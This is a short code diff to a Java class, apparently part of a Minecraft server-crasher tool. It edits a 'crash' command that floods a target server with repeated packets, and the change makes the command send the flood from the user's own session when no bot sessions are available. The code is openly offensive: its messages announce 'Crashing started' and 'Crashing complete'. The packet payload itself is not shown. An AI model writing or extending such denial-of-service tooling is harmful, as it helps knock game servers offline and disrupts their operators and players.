@@ -77,7 +77,11 @@ public class FileUtil {
                         public void execute(Player sender, int amount) {
                             ChatUtil.sendChatMessage("&2>> &8Crashing started, method: &6" + getName().toUpperCase(), sender, false);
                             final int time = (int) System.currentTimeMillis();
-                            sender.getBots().forEach(b -> IntStream.range(0, amount).forEach(i -> b.getSession().sendPacket(p)));
+                            if(sender.getBots().size() > 0) {
+                                sender.getBots().forEach(b -> IntStream.range(0, amount).forEach(i -> b.getSession().sendPacket(p)));
+                            } else {
+                                IntStream.range(0, amount).forEach(i -> sender.getRemoteSession().sendPacket(p));
+                            }
                             final int time2 = (int) System.currentTimeMillis() - time;
                             ChatUtil.sendChatMessage("&2>> &8Crashing complete &7(&e" + time2 + "ms&7)", sender, false);
                         }
